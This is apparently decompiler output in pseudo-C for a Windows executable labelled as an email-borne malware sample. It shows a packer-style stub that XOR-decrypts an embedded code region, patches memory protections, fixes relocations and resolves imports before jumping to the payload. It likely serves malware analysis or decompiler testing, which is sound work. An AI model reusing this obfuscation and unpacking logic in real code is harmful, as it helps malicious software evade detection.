// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0405/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(word32 eax, word32 ecx, word32 edx, word32 ebx)
{
fn00401000_entry:
l00401000:
	SHLWAPI.dll!StrChrA()
	Eq_3 * esi_115 = null
	branch eax != 0x00000000 l00401026
l00401016:
	SHLWAPI.dll!StrStrIA()
	branch eax == 0x00000000 l0040102D
l00401026:
	return
l0040102D:
	code * eax_68 = GetProcAddress(LoadLibraryA(0x00404084), 0x0040407C)
	eax_68()
	word32 edi_404 = eax_68 + 0x0000001C
	branch AreAllAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) != 0x00000000 l0040106C
l00401069:
	edi_404 = eax_68 + 0x0000001C ^ 0x0000000E
l0040106C:
	fp->dwFFFFFFB8 = fp - 0x00000034;
	fp->dwFFFFFFB8 = 0x00000040;
	VirtualProtect(0x00401000, 0x00003000, 0xFFFFFFFF, 0xFFFFFFFF)
	Eq_56 * eax_105 = null
l00401085:
	branch esi_115 != edi_404 l0040108B
l00401089:
	esi_115 = null;
l0040108B:
	eax_105->b402378 = esi_115->b405000 ^ eax_105->b402378 ^ 0x5A;
	Eq_3 * esi_123 = esi_115 + 1
	branch esi_123 != edi_404 l004010A9
l004010A7:
	esi_123 = null;
l004010A9:
	eax_105->b402379 = esi_123->b405000 ^ eax_105->b402379 ^ 0x5A;
	Eq_3 * esi_134 = esi_123 + 1
	branch esi_134 != edi_404 l004010C7
l004010C5:
	esi_134 = null;
l004010C7:
	eax_105->b40237A = esi_134->b405000 ^ eax_105->b40237A ^ 0x5A;
	Eq_3 * esi_145 = esi_134 + 1
	branch esi_145 != edi_404 l004010E5
l004010E3:
	esi_145 = null;
l004010E5:
	eax_105->b40237B = esi_145->b405000 ^ eax_105->b40237B ^ 0x5A;
	Eq_3 * esi_156 = esi_145 + 1
	branch esi_156 != edi_404 l00401103
l00401101:
	esi_156 = null;
l00401103:
	eax_105->b40237C = esi_156->b405000 ^ eax_105->b40237C ^ 0x5A;
	Eq_3 * esi_167 = esi_156 + 1
	branch esi_167 != edi_404 l00401121
l0040111F:
	esi_167 = null;
l00401121:
	eax_105 = eax_105 + 1;
	eax_105->b402377 = esi_167->b405000 ^ eax_105->b40237D ^ 0x5A;
	esi_115 = esi_167 + 1;
	branch eax_105 <u (Eq_56 *) 0x00001440 l00401085
l00401147:
	Eq_166 * esi_184 = &globals->t403678
	up32 dwLoc2C_194 = 0x00000000
	up32 ecx_195 = 0x00000000
l00401170:
	word32 eax_204 = esi_184->dw0004
	Eq_188 * edx_210 = &esi_184->t0008
	branch eax_204 - 0x00000008 >>u 0x00000001 <= 0x00000000 l004011B1
l00401182:
	uint32 ebx_363 = eax_204 - 0x00000008 >>u 0x00000001
l00401184:
	word32 eax_367 = (word32) edx_210->w0000
	branch (eax_367 & 0x0000F000) != 0x00003000 l004011A5
l0040119A:
	Eq_195 * eax_381 = (eax_367 & 0x00000FFF) + esi_184->dw0000
	eax_381->dw4020F8 = eax_381->dw4020F8 + 0xF04020F8;
l004011A5:
	edx_210 = edx_210 + 1;
	ebx_363 = ebx_363 - 0x00000001;
	branch ebx_363 != 0x00000000 l00401184
l004011AD:
	ecx_195 = dwLoc2C_194;
l004011B1:
	ecx_195 = ecx_195 + esi_184->dw0004;
	dwLoc2C_194 = ecx_195;
	esi_184 = esi_184 + Mem180[esi_184 + 0x00000004:word32];
	branch ecx_195 <u 0x000000E8 l00401170
l004011C6:
	Eq_219 * edi_225 = &globals->t402E6C
	Eq_219 * dwLoc2C_226 = &globals->t402E6C
	branch globals->dw402E7C == 0x00000000 l0040126B
l004011DD:
	edi_248 = edi_225;
l004011E0:
	Eq_219 * edi_248
	Eq_14 eax_257 = LoadLibraryA(edi_248->dw000C + 0x004020F8)
	Eq_14 ecx_259 = eax_257
	branch eax_257 == 0x00000000 l0040125A
l004011F9:
	word32 eax_284 = edi_248->dw0000
	branch eax_284 != 0x00000000 l00401202
l004011FF:
	eax_284 = edi_248->dw0010;
l00401202:
	Eq_250 * ebp_289 = eax_284 + 0x004020F8
	Eq_253 eax_292 = ebp_289->t0000
	Eq_257 * edi_293 = edi_248->dw0010 + 0x004020F8
	branch eax_292 == 0x00000000 l00401252
l00401215:
	goto l0040121B
l00401217:
	ecx_259 = eax_257;
l0040121B:
	code * eax_333
	branch eax_292 >= 0x00000000 l00401230
l0040121F:
	eax_333 = GetProcAddress(ecx_259, (word32) ebp_289->t0000);
	goto l00401243
l00401230:
	eax_333 = GetProcAddress(ecx_259, eax_292.u0);
l00401243:
	edi_293->ptr0000 = eax_333;
	ebp_289 = ebp_289 + 1;
	eax_292 = ebp_289->t0000;
	edi_293 = edi_293 + 1;
	branch eax_292 != 0x00000000 l00401217
l00401252:
	edi_248 = dwLoc2C_226;
l0040125A:
	edi_248 = edi_248 + 1;
	dwLoc2C_226 = edi_248;
	branch edi_248->dw0010 != 0x00000000 l004011E0
l0040126B:
	0x00402B58()
	ExitProcess(0x00000000)
	int3()
fn00401000_exit:
}

